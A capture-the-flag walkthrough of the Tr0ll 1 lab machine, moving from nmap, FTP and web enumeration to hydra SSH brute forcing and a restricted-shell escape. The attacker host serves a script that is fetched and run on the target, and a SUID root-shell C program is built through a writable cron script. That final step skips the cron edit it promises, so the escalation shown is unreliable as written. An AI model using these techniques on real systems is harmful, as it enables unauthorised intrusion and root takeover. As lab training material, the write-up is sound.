**Vulnerable System**: Tr0ll 1
==============================

**Operating System**: Ubuntu 14.04

**Kernel**: 3.13.0

**Due to this being a capture the flag (CTF) challenge, I will not be
summarizing vulnerabilities as I normally do.**

Methodology
-----------

Host Discovery (Netdiscover)

Port Scanning (nmap)

FTP enumeration (ftp)

pcap enumeration (wireshark)

Web Enumeration (nikto, gobuster, browser)

SSH Bruteforcing (hydra)

Low Privilege Shell (SSH)

Privilege Escalation (linuxprivchecker.py, files with weak permissions)

Reconnaissance
--------------

### Netdiscover

Host Discovery

```
root@lifesfun:~# netdiscover -r 192.168.20.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.20.1    00:50:56:c0:00:01      1      60  VMware, Inc.                
 192.168.20.150  00:0c:29:a1:df:41      1      60  VMware, Inc.                
 192.168.20.254  00:50:56:fc:81:bb      1      60  VMware, Inc.
```

### Nmap

Nmap all ports scan:

```
root@lifesfun:~# nmap -p- 192.168.20.150
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-15 19:51 EDT
Nmap scan report for 192.168.20.150
Host is up (0.00019s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:A1:DF:41 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 15.75 seconds
```

Nmap aggresive version and default script scan:

```
root@lifesfun:~# nmap -sV -sC -A -p 21,22,80 192.168.20.150
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-15 19:51 EDT
Nmap scan report for 192.168.20.150
Host is up (0.00036s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.20.144
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:A1:DF:41 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms 192.168.20.150
```

### FTP

Enumerating FTP folder, authenticating as anonymous user.

```
root@lifesfun:~/vulnhub/tr0ll# ftp 192.168.20.150
Connected to 192.168.20.150.
220 (vsFTPd 3.0.2)
Name (192.168.20.150:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.01 secs (662.5383 kB/s)
```

### Wireshark

Looking through the pcap file retrieved from the FTP server, there is an
interesting FTP-Data packet.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Tr0ll%201/Images/9044855ca8296b45216bdd18d4ff1b11.png?raw=true)

Following the TCP stream.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Tr0ll%201/Images/c9dd9012946ac16a6e272515a0b5c2f1.png?raw=true)

### Web Port Enumeration

#### Nikto

Enumerating for web application vulnerabilities.

```
root@lifesfun:~# nikto -h 192.168.20.150
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.20.150
+ Target Hostname:    192.168.20.150
+ Target Port:        80
+ Start Time:         2019-09-15 19:53:42 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. 
This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. 
This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/secret/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). 
Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7916 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2019-09-15 19:54:06 (GMT-4) (24 seconds)
---------------------------------------------------------------------------
```

#### Gobuster

Enumerating for hidden directories with GoBuster

```
root@lifesfun:~# gobuster dir -u 192.168.20.150 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.20.150
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/15 19:57:11 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2019/09/15 19:57:12 Finished
===============================================================
```

#### Browser

Enumerating website with the browser.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Tr0ll%201/Images/d9e4770e426d5ba1e6be3ccde7e96b02.png?raw=true)

/secret directory

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Tr0ll%201/Images/d9e4770e426d5ba1e6be3ccde7e96b02.png?raw=true)

Plugging in evidence found from the pcap into the browser; yet another directory
is discovered, containing file called roflmao

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Tr0ll%201/Images/e7865f9897ae469c9451251359c9ef16.png?raw=true)

Once the file is downloaded, it’s time for enumeration.

```
root@lifesfun:~/vulnhub/tr0ll# file roflmao 
roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped
root@lifesfun:~/vulnhub/tr0ll# strings roflmao 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
printf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
Find address 0x0856BF to proceed
```

Back to the browser.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Tr0ll%201/Images/0736254afa78ab3e42037e8d560bc425.png?raw=true)

The folder good_luck contained a text file.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Tr0ll%201/Images/92b8a17ac4acdbd9368615171dec92ba.png?raw=true)

After downloading the text file it appears to be some sort of a wordlist.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Tr0ll%201/Images/c536d070db5e4c62a48a31386eb7fc4c.png?raw=true)

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Tr0ll%201/Images/5598cfb72ecb0d573ee88c1b05a23f34.png?raw=true)

Pass.txt content.

```
root@lifesfun:~/vulnhub/tr0ll# cat Pass.txt 
Good_job_:)
```

Low Privilege Exploitation
--------------------------

### Hydra

After some experimenting with Good_job as a password, "Pass.txt" ended up being
the actual password.

```
root@lifesfun:~/vulnhub/tr0ll# hydra -L which_one_lol.txt -p Pass.txt ssh://192.168.20.150
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, 
or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-15 20:30:11
[WARNING] Many SSH configurations limit the number of parallel tasks, 
it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://192.168.20.150:22/
[22][ssh] host: 192.168.20.150   login: overflow   password: Pass.txt
1 of 1 target successfully completed, 1 valid password found
```

### SSH

After obtaining SSH password, it seems that commands in the shell do not work. The shell has to be escaped/upgraded. 
Python is used to escape restricted shell. However, after that the system terminates SSH session. It seems like there's a timer.

```
root@lifesfun:~/vulnhub/tr0ll# ssh overflow@192.168.20.150
overflow@192.168.20.150's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
$ whoami?
-sh: 1: whoami?: not found
$ echo $SHELL
/bin/sh
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
$ python -c "import pty;pty.spawn('/bin/bash')"
overflow@troll:/$ whoami
overflow
                                                                               
Broadcast Message from root@trol                                               
        (somewhere) at 17:40 ...                                               
                                                                               
TIMES UP LOL!                                                                  
```

Privilege Escalation
--------------------


### Enumeration

After logging in again, [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) script is downloaded to the victim's machine to enumerate possible privilege escalation vectors.

``
overflow@troll:/tmp$ wget 192.168.20.144/linuxprivchecker.py
--2019-09-15 17:47:57--  http://192.168.20.144/linuxprivchecker.py
Connecting to 192.168.20.144:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 25304 (25K) [text/x-python]
Saving to: ‘linuxprivchecker.py’

100%[======================================>] 25,304      --.-K/s   in 0s      

2019-09-15 17:47:57 (163 MB/s) - ‘linuxprivchecker.py’ saved [25304/25304]

overflow@troll:/tmp$ python linuxprivchecker.py 
=================================================================================================
LINUX PRIVILEGE ESCALATION CHECKER
=================================================================================================
[+] World Writable Files
    -rwxrwxrwx 1 troll root 8068 Aug 10  2014 /srv/ftp/lol.pcap
    -rwxrwxrwx 1 root root 34 Aug 13  2014 /var/tmp/cleaner.py.swp
    -rwxrwxrwx 1 root root 7296 Aug 11  2014 /var/www/html/sup3rs3cr3tdirlol/roflmao
    -rwxrwxrwx 1 root root 23 Aug 13  2014 /var/log/cronlog
    --w--w--w- 1 root root 0 Sep 15 17:45 /sys/fs/cgroup/systemd/user/1002.user/4.session/cgroup.event_control
    --w--w--w- 1 root root 0 Sep 15 17:45 /sys/fs/cgroup/systemd/user/1002.user/cgroup.event_control
    --w--w--w- 1 root root 0 Sep 15 17:30 /sys/fs/cgroup/systemd/user/cgroup.event_control
    --w--w--w- 1 root root 0 Sep 15 16:41 /sys/fs/cgroup/systemd/cgroup.event_control
    -rw-rw-rw- 1 root root 0 Sep 15 16:41 /sys/kernel/security/apparmor/.access
    -rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
```

There are some interesting world writeable files on the system.

Enumerating contents of /var/log/cronlog and /lib/log/cleaner.py

```
overflow@troll:/var$ cat /var/log/cronlog 
*/2 * * * * cleaner.py
overflow@troll:/tmp$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
	os.system('rm -r /tmp/* ')
except:
	sys.exit()
```

It looks like cronlog file is a cron job which runs cleaner.py.

Since cleaner.py is editable, the command execute by os.system can be replaced with a few
commands that will make a SUID binary executing root shell.

First, SUID binary has to be created. The code for SUID binary can be found on
[GitHub](https://github.com/1N3/PrivEsc/blob/master/linux/linux_exploits/suid.c)

```
overflow@troll:/tmp$ nano root.c
int main(void) {
	       setgid(0); setuid(0);
	       execl("/bin/sh","sh",0); }

overflow@troll:/tmp$ ls
root.c
```

Once the C file with root privileges is created, it can be compiled.

```
overflow@troll:/tmp$ gcc root.c -o root
```

Next, some time is given for the cronjob to run.

```
overflow@troll:/tmp$ ls -laht
total 20K
drwxrwxrwt  2 root     root     4.0K Sep 15 17:58 .
-rwxrwxr-x  1 overflow overflow 7.2K Sep 15 17:58 root
-rw-rw-r--  1 overflow overflow   80 Sep 15 17:58 root.c
```

### Exploitation

Executing newly created SUID with privilege escalation capabilities.

```
overflow@troll:/$ cd /tmp
overflow@troll:/tmp$ ls
root  root.c
overflow@troll:/tmp$ ./root
# whoami
Root
```

### Root Flag

```
# cd /root
# ls
proof.txt
# cat proof.txt	
Good job, you did it!
```
